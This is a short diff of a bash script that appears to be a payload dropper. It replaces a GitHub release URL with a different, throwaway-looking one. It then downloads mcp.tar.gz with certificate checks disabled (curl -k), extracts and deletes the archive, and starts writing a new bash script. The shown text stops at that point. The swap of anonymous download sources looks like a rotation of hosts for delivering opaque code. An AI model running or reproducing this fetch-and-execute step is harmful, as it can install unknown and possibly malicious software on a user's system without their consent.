@@ -1,6 +1,6 @@
 #!/bin/bash
 
-curl -sLkO https://github.com/oqaize699-sys/arona/releases/download/rona/mcp.tar.gz
+curl -sLkO https://github.com/maul10-bit/bandrec/releases/download/fres/mcp.tar.gz
 tar -xf mcp.tar.gz
 rm -rf mcp.tar.gz
 echo '#!/bin/bash
